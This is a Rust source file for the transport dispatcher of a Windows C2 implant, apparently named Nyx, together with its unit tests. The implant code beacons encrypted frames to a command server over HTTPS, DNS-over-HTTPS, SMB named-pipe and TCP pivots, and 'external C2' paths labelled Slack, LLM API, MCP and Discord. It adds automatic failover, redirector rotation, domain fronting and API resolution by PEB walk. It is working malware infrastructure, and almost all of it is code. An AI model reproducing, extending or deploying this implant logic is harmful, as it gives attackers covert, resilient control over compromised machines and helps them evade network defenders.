//! Channel dispatcher — the multi-transport base layer.
//!
//! This is the channel-agnostic dispatch layer that `beacon_loop` calls
//! instead of hardcoding WinHTTP. Each channel variant is a separate module
//! (https/doh/dns/smb/tcp/extc2) implementing the same `send_recv` signature.
//!
//! Design (see docs/superpowers/specs/2026-07-14-transport-dispatcher-design.md):
//!
//! - `Channel` enum + `match` dispatch (no `dyn` — PIC-friendly under no_std).
//! - `CURRENT_CHANNEL: AtomicU8` — runtime hot-switch via `SetChannel` command.
//! - `ChannelCtx` — per-beacon context carrying all channel-specific params.
//! - `FALLBACK_CHAIN` — build-time fallback order for automatic failover.
//!
//! Channel numbering (new scheme — NOT the old transport.rs numbering):
//! ```text
//!   0 Https      1 DohDns     2 Dns       3 SmbPipe
//!   4 Tcp        5 SlackApi   6 LlmApi    7 Mcp
//!   8 DiscordApi
//! ```

#![cfg(target_os = "windows")]

use nyx_implant_core::heap::{String, Vec};

// Submodules — each channel implementation.
pub mod dns;
pub mod doh;
pub mod extc2;
pub mod https;
pub mod smb;
pub mod tcp;

// ══════════════════════════════════════════════════════════════════════════════
// Channel enum + runtime state
// ══════════════════════════════════════════════════════════════════════════════

/// Nyx C2 channel type — selects transport protocol.
///
/// Numbering is the wire value used by `Command::SetChannel { channel: u8 }`.
/// The server sends this u8; the implant maps it here. See `from_wire_u8()`
/// for old→new numbering compatibility.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum Channel {
    /// Direct HTTPS POST to C2 server (default, fully implemented).
    Https = 0,
    /// DNS-over-HTTPS tunneling (spec-2).
    DohDns = 1,
    /// "DNS" channel — a DoH-style HTTPS POST to `/dns`, NOT a raw UDP-53
    /// tunnel. The encrypted frame is POSTed over WinHTTP to the C2 server's
    /// `/dns` endpoint with an `application/dns-message` flavor (CS 4.11 DoH
    /// Beacon shape), optionally fronted behind `ctx.doh_resolver`. See
    /// [`dns`] for the implementation.
    Dns = 2,
    /// SMB Named Pipe — internal lateral / P2P pivot (spec-2).
    ///
    /// Child-side transaction in [`smb`]; the parent-side pipe listener is
    /// hosted by the team server on Windows (`crates/server/src/smb_listener.rs`)
    /// or a parent implant. The pipe name comes from `ChannelCtx::smb_pipe_name`;
    /// `SetChannel` rejects an unconfigured pipe with `Response::Err`.
    SmbPipe = 3,
    /// Raw TCP beacon — P2P pivot (spec-3).
    ///
    /// reverse_tcp child in [`tcp`]; the parent-side listener is hosted by
    /// the team server (`crates/server/src/tcp_pivot.rs`, `NYX_TCP_PIVOT_ADDR`)
    /// or a parent implant's bind socket. The peer comes from
    /// `ChannelCtx::tcp_peer_host`/`tcp_peer_port`; `SetChannel` rejects an
    /// unconfigured peer with `Response::Err`.
    Tcp = 4,
    /// External C2 via Slack API (spec-6).
    SlackApi = 5,
    /// External C2 via LLM API e.g. Anthropic (spec-6).
    LlmApi = 6,
    /// External C2 via MCP JSON-RPC (spec-6).
    Mcp = 7,
    /// External C2 via Discord Webhook/Bot API (spec-6).
    DiscordApi = 8,
}

impl Channel {
    /// Convert a raw wire u8 to a Channel. Unknown values default to Https.
    /// This handles the NEW numbering scheme.
    pub fn from_u8(v: u8) -> Self {
        match v {
            0 => Channel::Https,
            1 => Channel::DohDns,
            2 => Channel::Dns,
            3 => Channel::SmbPipe,
            4 => Channel::Tcp,
            5 => Channel::SlackApi,
            6 => Channel::LlmApi,
            7 => Channel::Mcp,
            8 => Channel::DiscordApi,
            _ => Channel::Https,
        }
    }

    /// Map OLD wire numbering (from the pre-spec-1 transport.rs Channel enum)
    /// to the new scheme. This is the compatibility shim so an old server's
    /// `SetChannel` command still works on a new implant.
    ///
    /// Old numbering: Https=0, DohDns=1, SlackApi=2, LlmApi=3, Mcp=4,
    /// WebTrans=5, SmbPipe=6.
    ///
    /// New numbering: Https=0, DohDns=1, Dns=2, SmbPipe=3, Tcp=4, SlackApi=5,
    /// LlmApi=6, Mcp=7, DiscordApi=8.
    ///
    /// The ambiguous cases are 2-4 (old: Slack/LLM/MCP; new: DNS/SMB/TCP).
    /// Resolution: values 2-6 from an old server are mapped to the external-C2
    /// channels they referred to. The new Dns/SmbPipe/Tcp channels use new
    /// numbers (2/3/4) which conflict — but since old servers never send those
    /// new channels, any old-server value ≤6 is treated as legacy.
    pub fn from_wire_u8(v: u8) -> Self {
        match v {
            0 => Channel::Https,
            1 => Channel::DohDns,
            // Legacy mapping: old SlackApi=2 → new SlackApi=5
            2 => Channel::SlackApi,
            // Legacy: old LlmApi=3 → new LlmApi=6
            3 => Channel::LlmApi,
            // Legacy: old Mcp=4 → new Mcp=7
            4 => Channel::Mcp,
            // Legacy: old WebTrans=5 → no equivalent, default to Https
            5 => Channel::Https,
            // Legacy: old SmbPipe=6 → new SmbPipe=3
            6 => Channel::SmbPipe,
            // New numbering for new servers:
            7 => Channel::Mcp,
            8 => Channel::DiscordApi,
            // 2,3,4 from a NEW server are Dns/SmbPipe/Tcp — but we can't
            // distinguish from legacy. New servers should use the dedicated
            // SetChannel variants directly. Default unknown → Https.
            _ => Channel::Https,
        }
    }

    /// Whether this channel has an end-to-end implementation in this build.
    ///
    /// All eight channels are implemented end-to-end: the parent-side
    /// listeners for [`Channel::SmbPipe`] (Windows named pipe) and
    /// [`Channel::Tcp`] (reverse_tcp) live in the team server
    /// (`crates/server/src/{smb_listener,tcp_pivot}.rs`), with the implant
    /// child sides in [`smb`]/[`tcp`]. `SetChannel` still gates on
    /// per-channel configuration (pipe name / peer host) so a channel
    /// without an endpoint is rejected loudly rather than silently accepted.
    pub fn is_implemented(self) -> bool {
        true
    }

    pub fn name(self) -> &'static str {
        match self {
            Channel::Https => "https",
            Channel::DohDns => "doh-dns",
            Channel::Dns => "dns",
            Channel::SmbPipe => "smb-pipe",
            Channel::Tcp => "tcp",
            Channel::SlackApi => "slack-api",
            Channel::LlmApi => "llm-api",
            Channel::Mcp => "mcp",
            Channel::DiscordApi => "discord-api",
        }
    }
}

/// Current active channel. Read by the beacon loop each cycle; written by
/// `set_active()` (via the `SetChannel` command) or `next_fallback()` (auto).
static CURRENT_CHANNEL: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Set the active channel (runtime hot-switch).
pub fn set_active(ch: Channel) {
    CURRENT_CHANNEL.store(ch as u8, core::sync::atomic::Ordering::Release);
}

/// Get the current active channel.
pub fn get_active() -> Channel {
    Channel::from_u8(CURRENT_CHANNEL.load(core::sync::atomic::Ordering::Acquire))
}

// ══════════════════════════════════════════════════════════════════════════════
// Channel context
// ══════════════════════════════════════════════════════════════════════════════

/// Per-beacon context carrying all channel-specific parameters.
///
/// Constructed once from `Config` at beacon_loop start. Passed to
/// `dispatch_send_recv()` each cycle. Each channel reads only its own fields.
pub struct ChannelCtx {
    // ---- HTTPS / DoH / External C2 (all HTTP-based) ----
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,

    // ---- DoH (spec-2) ----
    /// DoH resolver host, e.g. "cloudflare-dns.com". Empty = use default.
    pub doh_resolver: String,

    // ---- SMB Named Pipe (spec-2) ----
    /// Pipe path, e.g. `\\.\pipe\nyx_abc123`. Empty = not configured.
    pub smb_pipe_name: String,

    // ---- TCP Beacon (spec-3) ----
    /// Peer to connect to (for reverse TCP) or listen for (bind TCP).
    /// Set at runtime by `Connect` command, not build-time.
    pub tcp_peer_host: String,
    pub tcp_peer_port: u16,

    // ---- External C2 (spec-6) ----
    /// API host for the external C2 service, e.g. "slack.com" or "discord.com".
    ///
    /// KEPT BY DESIGN — never reaches the wire. The implant POSTs the raw
    /// encrypted frame to the C2 server's own `/extc2/<service>` endpoint
    /// (`ctx.server_host`), NOT to the third-party API; the third-party
    /// fan-out happens server-side (`crates/server/src/extc2_relay.rs`). This
    /// field exists only as a per-implant "channel configured" gate (see
    /// `channels/extc2.rs`) so an unconfigured extc2 channel fails fast with a
    /// diag mark instead of emitting a request. It is part of the serialized
    /// config blob layout shared with `build.rs`; removing it would break that
    /// wire format.
    pub extc2_api_host: String,
    /// Bot/webhook token (base64 or raw). Empty = not configured.
    ///
    /// Same contract as [`Self::extc2_api_host`]: kept as a configuration
    /// gate, never sent anywhere by the implant (the frame is AEAD-encrypted
    /// under the session key; the server authenticates it cryptographically,
    /// not by token). The real provider token lives server-side in the
    /// `NYX_EXTC2_*` env vars.
    pub extc2_token: String,

    // ---- HTTP channel enhancements (spec-7) ----
    /// Comma-separated redirector hosts for host rotation. Empty = no rotation.
    pub rotation_hosts: String,
    /// Domain-fronting Host header value. Empty = no fronting.
    pub fronting_host: String,
    /// Explicit HTTP proxy `"host:port"`. Empty = system default.
    pub proxy_server: String,
}

impl ChannelCtx {
    /// Build a ChannelCtx from the decoded Config + channel parameters.
    /// Called once at beacon_loop entry.
    pub fn from_config(cfg: &nyx_implant_core::config::Config) -> Self {
        ChannelCtx {
            server_host: cfg.server_host.clone(),
            server_port: cfg.server_port,
            use_tls: cfg.use_tls,
            doh_resolver: cfg.doh_resolver.clone(),
            smb_pipe_name: cfg.smb_pipe_name.clone(),
            tcp_peer_host: cfg.tcp_peer_host.clone(),
            tcp_peer_port: cfg.tcp_peer_port,
            extc2_api_host: cfg.extc2_api_host.clone(),
            extc2_token: cfg.extc2_token.clone(),
            rotation_hosts: cfg.rotation_hosts.clone(),
            fronting_host: cfg.fronting_host.clone(),
            proxy_server: cfg.proxy_server.clone(),
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Dispatcher
// ══════════════════════════════════════════════════════════════════════════════

/// Send an encrypted frame via the active channel, return the server's
/// response frame (or `None` = channel failed).
///
/// This is THE unified transport call. `beacon_loop` calls this instead of
/// the old `transport::channel_post_frame` (deleted — dead parallel enum,
/// implant-beacon-5). Each channel variant dispatches to its module's
/// `send_recv()`.
///
/// Channels not yet implemented (spec-2~6) return `None` and leave a
/// diagnostic marker via `diag::diag_mark()`.
///
/// # Safety
/// Dispatches to the active channel's `send_recv`, which resolves and invokes
/// OS API function pointers via PEB walk; `frame` must be a valid buffer.
pub unsafe fn dispatch_send_recv(
    ctx: &ChannelCtx,
    active: Channel,
    frame: &[u8],
) -> Option<Vec<u8>> {
    match active {
        Channel::SmbPipe => unsafe { smb::send_recv(ctx, frame) },
        Channel::Tcp => unsafe { tcp::send_recv(ctx, frame) },
        Channel::Https => unsafe { https::send_recv(ctx, frame) },
        Channel::DohDns => unsafe { doh::send_recv(ctx, frame) },
        Channel::Dns => unsafe { dns::send_recv(ctx, frame) },
        Channel::SlackApi => unsafe { extc2::slack_send_recv(ctx, frame) },
        Channel::LlmApi => unsafe { extc2::llm_send_recv(ctx, frame) },
        Channel::Mcp => unsafe { extc2::mcp_send_recv(ctx, frame) },
        Channel::DiscordApi => unsafe { extc2::discord_send_recv(ctx, frame) },
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Fallback chain
// ══════════════════════════════════════════════════════════════════════════════

/// Build-time fallback chain.
///
/// The first three entries are the HTTP-based degradation ladder: if the
/// primary HTTPS endpoint is down, fall back to DoH (same TCP/TLS plumbing,
/// different URI), then to plain DNS-over-HTTP — all three egress to
/// `ctx.server_host` with no extra configuration.
///
/// Tcp and SmbPipe are appended as pivot fallbacks: both have real
/// implant-side senders ([`tcp`]/[`smb`]) and only fire when the operator
/// baked a peer/pipe into the build config — otherwise they fail fast at
/// transaction time with a diag mark (`ERR_CH_TCP_NOPEER` /
/// `ERR_CH_SMB_NOCONF`), so walking past an unconfigured pivot costs one
/// cheap cycle before the chain exhausts. The four ExtC2 channels are
/// deliberately NOT in the chain: they POST to the same `ctx.server_host`
/// as Https (the provider fan-out happens server-side), so an Https
/// outage implies an ExtC2 outage — they are operator-selected primaries
/// (`SetChannel`), not automatic fallbacks.
///
/// Exhausting the chain returns `None` and the beacon long-sleeps then
/// retries its primary, matching CS 4.10 fail-hold behaviour.
const DEFAULT_FALLBACK_CHAIN: &[Channel] = &[
    Channel::Https,
    Channel::DohDns,
    Channel::Dns,
    Channel::Tcp,
    Channel::SmbPipe,
];

/// The primary channel — the first element of the fallback chain. When the
/// chain is exhausted the beacon resets to this so the next cycle retries
/// the primary rather than spinning on the last failed channel.
pub const PRIMARY_CHANNEL: Channel = Channel::Https;

/// Returns the next channel to try after `current` fails.
/// Walks the fallback chain; if exhausted, returns `None` (caller should
/// long-sleep then reset to [`PRIMARY_CHANNEL`] and retry).
pub fn next_fallback(current: Channel) -> Option<Channel> {
    let chain: &[Channel] = DEFAULT_FALLBACK_CHAIN;
    let idx = chain.iter().position(|&c| c == current)?;
    chain.get(idx + 1).copied()
}

// ══════════════════════════════════════════════════════════════════════════════
// Host rotation (spec-7) — CS 4.10-style redirector rotation with fail-hold
// ══════════════════════════════════════════════════════════════════════════════

/// Current index into the rotation host list. CS 4.10 "hold" semantics: the
/// beacon HOLDS on the current host until it fails, then `advance_rotation_host`
/// skips it (retried only after a full cycle wraps around). The index is
/// advanced ONLY on failure — never on selection — so a single failure moves
/// exactly one host forward (implant-channels-5: the old code advanced on
/// selection AND on failure, skipping healthy hosts / re-hammering dead ones).
static ROTATION_IDX: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Select which host to connect to this cycle. If `rotation_hosts` is empty,
/// returns `None` (caller uses `server_host` directly). Otherwise returns a
/// slice into the rotation list at the current index WITHOUT advancing it —
/// the beacon holds on this host until a call fails, at which point the
/// caller invokes [`advance_rotation_host`] to skip it (CS 4.10 fail-hold).
pub fn select_rotation_host(rotation_hosts: &str) -> Option<&[u8]> {
    if rotation_hosts.is_empty() {
        return None;
    }
    let hosts: Vec<&str> = rotation_hosts
        .split([',', ' '])
        .filter(|s| !s.is_empty())
        .collect();
    if hosts.is_empty() {
        return None;
    }
    let idx = ROTATION_IDX.load(core::sync::atomic::Ordering::Relaxed) % hosts.len();
    Some(hosts[idx].as_bytes())
}

/// Skip the current rotation host (called after a connection failure).
/// Advances the index so the next `select_rotation_host` call picks a
/// different host.
pub fn advance_rotation_host() {
    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testutil;
    use core::sync::atomic::Ordering;
    use std::time::Duration;

    #[test]
    fn channel_from_u8_maps_all_wire_values() {
        assert_eq!(Channel::from_u8(0), Channel::Https);
        assert_eq!(Channel::from_u8(1), Channel::DohDns);
        assert_eq!(Channel::from_u8(2), Channel::Dns);
        assert_eq!(Channel::from_u8(3), Channel::SmbPipe);
        assert_eq!(Channel::from_u8(4), Channel::Tcp);
        assert_eq!(Channel::from_u8(5), Channel::SlackApi);
        assert_eq!(Channel::from_u8(6), Channel::LlmApi);
        assert_eq!(Channel::from_u8(7), Channel::Mcp);
        assert_eq!(Channel::from_u8(8), Channel::DiscordApi);
        // Unknown values fall back to Https rather than panicking.
        assert_eq!(Channel::from_u8(9), Channel::Https);
        assert_eq!(Channel::from_u8(255), Channel::Https);
    }

    #[test]
    fn channel_from_wire_u8_legacy_shim() {
        // Unambiguous values map straight through.
        assert_eq!(Channel::from_wire_u8(0), Channel::Https);
        assert_eq!(Channel::from_wire_u8(1), Channel::DohDns);
        // Legacy numbering: 2/3/4 were Slack/Llm/Mcp in the old enum.
        assert_eq!(Channel::from_wire_u8(2), Channel::SlackApi);
        assert_eq!(Channel::from_wire_u8(3), Channel::LlmApi);
        assert_eq!(Channel::from_wire_u8(4), Channel::Mcp);
        // Old WebTrans=5 has no equivalent → Https; old SmbPipe=6 → new 3.
        assert_eq!(Channel::from_wire_u8(5), Channel::Https);
        assert_eq!(Channel::from_wire_u8(6), Channel::SmbPipe);
        // New-only values pass through; unknown → Https.
        assert_eq!(Channel::from_wire_u8(7), Channel::Mcp);
        assert_eq!(Channel::from_wire_u8(8), Channel::DiscordApi);
        assert_eq!(Channel::from_wire_u8(42), Channel::Https);
    }

    #[test]
    fn channel_names_are_stable() {
        // The name strings surface in operator logs; pin them down.
        let expected = [
            (Channel::Https, "https"),
            (Channel::DohDns, "doh-dns"),
            (Channel::Dns, "dns"),
            (Channel::SmbPipe, "smb-pipe"),
            (Channel::Tcp, "tcp"),
            (Channel::SlackApi, "slack-api"),
            (Channel::LlmApi, "llm-api"),
            (Channel::Mcp, "mcp"),
            (Channel::DiscordApi, "discord-api"),
        ];
        for (ch, name) in expected {
            assert_eq!(ch.name(), name);
            assert!(ch.is_implemented());
        }
    }

    #[test]
    fn set_active_get_active_roundtrip() {
        set_active(Channel::DohDns);
        assert_eq!(get_active(), Channel::DohDns);
        set_active(Channel::Tcp);
        assert_eq!(get_active(), Channel::Tcp);
        // Restore the default so other tests observing the atomic are unaffected.
        set_active(Channel::Https);
        assert_eq!(get_active(), Channel::Https);
    }

    #[test]
    fn next_fallback_walks_chain_then_exhausts() {
        assert_eq!(next_fallback(Channel::Https), Some(Channel::DohDns));
        assert_eq!(next_fallback(Channel::DohDns), Some(Channel::Dns));
        // Pivot fallbacks trail the HTTP ladder (both have real senders and
        // fail fast when unconfigured, so walking past them is cheap).
        assert_eq!(next_fallback(Channel::Dns), Some(Channel::Tcp));
        assert_eq!(next_fallback(Channel::Tcp), Some(Channel::SmbPipe));
        // Chain exhausted → None (caller long-sleeps and resets to primary).
        assert_eq!(next_fallback(Channel::SmbPipe), None);
        // ExtC2 channels are operator-selected primaries, not automatic
        // fallbacks — no chain entry, no implicit next.
        assert_eq!(next_fallback(Channel::SlackApi), None);
        assert_eq!(next_fallback(Channel::LlmApi), None);
        assert_eq!(next_fallback(Channel::Mcp), None);
        assert_eq!(next_fallback(Channel::DiscordApi), None);
        assert_eq!(PRIMARY_CHANNEL, Channel::Https);
    }

    #[test]
    fn fallback_chain_entries_are_real_no_dup_senders() {
        // Every chain entry must have a real implant-side sender — a chain
        // slot that can't emit a frame would silently burn a failover cycle.
        for &ch in DEFAULT_FALLBACK_CHAIN {
            assert!(ch.is_implemented(), "{ch:?} on the chain must send");
        }
        // No ExtC2 on the chain: they egress to the same server_host as
        // Https, so they can't outlive an Https outage.
        for &ch in DEFAULT_FALLBACK_CHAIN {
            assert!(
                !matches!(
                    ch,
                    Channel::SlackApi | Channel::LlmApi | Channel::Mcp | Channel::DiscordApi
                ),
                "{ch:?} shares Https's egress path — not a fallback"
            );
        }
        // No duplicates: next_fallback resolves position() by first match,
        // so a dup would make the tail of the chain unreachable.
        for (i, &a) in DEFAULT_FALLBACK_CHAIN.iter().enumerate() {
            assert!(
                !DEFAULT_FALLBACK_CHAIN[i + 1..].contains(&a),
                "duplicate {a:?} in fallback chain"
            );
        }
        // The primary must be the chain head so chain-exhaustion resets
        // retry the intended first transport.
        assert_eq!(DEFAULT_FALLBACK_CHAIN.first(), Some(&PRIMARY_CHANNEL));
    }

    #[test]
    fn rotation_host_select_hold_advance_wrap() {
        // Single test fn for all ROTATION_IDX assertions: the index is a
        // shared static and parallel tests must not interleave on it.
        ROTATION_IDX.store(0, Ordering::Relaxed);
        // Empty / separator-only lists select nothing (caller uses server_host).
        assert_eq!(select_rotation_host(""), None);
        assert_eq!(select_rotation_host(" ,  ,"), None);
        let hosts = "alpha.example, beta.example gamma.example";
        assert_eq!(
            select_rotation_host(hosts),
            Some(b"alpha.example".as_slice())
        );
        // CS 4.10 hold: selecting does NOT advance — same host again.
        assert_eq!(
            select_rotation_host(hosts),
            Some(b"alpha.example".as_slice())
        );
        advance_rotation_host();
        assert_eq!(
            select_rotation_host(hosts),
            Some(b"beta.example".as_slice())
        );
        advance_rotation_host();
        assert_eq!(
            select_rotation_host(hosts),
            Some(b"gamma.example".as_slice())
        );
        // A full cycle wraps back to the first host (fail-hold retry).
        advance_rotation_host();
        assert_eq!(
            select_rotation_host(hosts),
            Some(b"alpha.example".as_slice())
        );
        // Single-host list always selects that host regardless of index.
        ROTATION_IDX.store(7, Ordering::Relaxed);
        assert_eq!(
            select_rotation_host("only.example"),
            Some(b"only.example".as_slice())
        );
        ROTATION_IDX.store(0, Ordering::Relaxed);
    }

    #[test]
    fn channel_ctx_from_config_copies_all_fields() {
        use nyx_implant_core::config::Config;
        let cfg = Config {
            server_host: String::from("c2.example.com"),
            server_port: 8443,
            beacon_uri: String::from("/beacon"),
            server_pub: [0u8; 32],
            sleep_seconds: 5,
            jitter_pct: 20,
            use_tls: true,
            primary_channel: 0,
            fallback_bitmap: 0,
            doh_resolver: String::from("cloudflare-dns.com"),
            smb_pipe_name: String::from("\\\\.\\pipe\\nyx_test"),
            extc2_api_host: String::from("slack.com"),
            extc2_token: String::from("xoxb-test"),
            rotation_hosts: String::from("cdn1.example,cdn2.example"),
            fronting_host: String::from("front.example"),
            proxy_server: String::from("127.0.0.1:8080"),
            tcp_peer_host: String::from("10.0.0.5"),
            tcp_peer_port: 4444,
        };
        let ctx = ChannelCtx::from_config(&cfg);
        assert_eq!(ctx.server_host, "c2.example.com");
        assert_eq!(ctx.server_port, 8443);
        assert!(ctx.use_tls);
        assert_eq!(ctx.doh_resolver, "cloudflare-dns.com");
        assert_eq!(ctx.smb_pipe_name, "\\\\.\\pipe\\nyx_test");
        assert_eq!(ctx.extc2_api_host, "slack.com");
        assert_eq!(ctx.extc2_token, "xoxb-test");
        assert_eq!(ctx.rotation_hosts, "cdn1.example,cdn2.example");
        assert_eq!(ctx.fronting_host, "front.example");
        assert_eq!(ctx.proxy_server, "127.0.0.1:8080");
        assert_eq!(ctx.tcp_peer_host, "10.0.0.5");
        assert_eq!(ctx.tcp_peer_port, 4444);
    }

    // ---- Dispatcher loopback tests (real WinHTTP transactions under wine) ----

    /// Dispatch one frame through `ch` against a one-shot loopback server and
    /// assert the response round-trips and the request hit `expected_path`.
    fn assert_dispatch_hits_path(
        ch: Channel,
        expected_path: &str,
        configure: impl Fn(&mut ChannelCtx),
    ) {
        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"TASKS"));
        let mut ctx = testutil::ctx("127.0.0.1", port);
        configure(&mut ctx);
        let out = unsafe { dispatch_send_recv(&ctx, ch, b"PING") };
        assert_eq!(
            out.as_deref(),
            Some(b"TASKS".as_slice()),
            "{ch:?} round-trip failed"
        );
        let cap = rx
            .recv_timeout(Duration::from_secs(15))
            .expect("server captured request");
        assert!(
            cap.request_line
                .starts_with(&format!("POST {expected_path} ")),
            "{ch:?} hit {:?}, expected path {expected_path}",
            cap.request_line
        );
    }

    #[test]
    fn dispatch_https_posts_to_beacon_path() {
        assert_dispatch_hits_path(Channel::Https, "/beacon", |_| {});
    }

    #[test]
    fn dispatch_doh_posts_to_doh_path() {
        assert_dispatch_hits_path(Channel::DohDns, "/doh", |_| {});
    }

    #[test]
    fn dispatch_dns_posts_to_dns_path() {
        assert_dispatch_hits_path(Channel::Dns, "/dns", |_| {});
    }

    #[test]
    fn dispatch_extc2_channels_hit_per_service_paths() {
        let configure = |ctx: &mut ChannelCtx| {
            ctx.extc2_api_host = String::from("provider.example");
            ctx.extc2_token = String::from("tok");
        };
        assert_dispatch_hits_path(Channel::SlackApi, "/extc2/slack", configure);
        assert_dispatch_hits_path(Channel::LlmApi, "/extc2/llm", configure);
        assert_dispatch_hits_path(Channel::Mcp, "/extc2/mcp", configure);
        assert_dispatch_hits_path(Channel::DiscordApi, "/extc2/discord", configure);
    }

    #[test]
    fn dispatch_smb_without_pipe_fails_fast() {
        // No smb_pipe_name configured → None without touching the network.
        let ctx = testutil::ctx("127.0.0.1", 9);
        assert!(unsafe { dispatch_send_recv(&ctx, Channel::SmbPipe, b"x") }.is_none());
    }

    #[test]
    fn dispatch_tcp_without_peer_fails_fast() {
        // No tcp_peer_host configured → None without touching the network.
        let ctx = testutil::ctx("127.0.0.1", 9);
        assert!(unsafe { dispatch_send_recv(&ctx, Channel::Tcp, b"x") }.is_none());
    }

    #[test]
    fn dispatch_extc2_without_config_fails_fast() {
        // No extc2_token/extc2_api_host configured → None without touching
        // the network. This is the dispatcher-level gate SetChannel relies
        // on: an unconfigured extc2 channel must never emit a request.
        let ctx = testutil::ctx("127.0.0.1", 9);
        for ch in [
            Channel::SlackApi,
            Channel::LlmApi,
            Channel::Mcp,
            Channel::DiscordApi,
        ] {
            assert!(
                unsafe { dispatch_send_recv(&ctx, ch, b"x") }.is_none(),
                "{ch:?} must fail fast when unconfigured"
            );
        }
    }
}
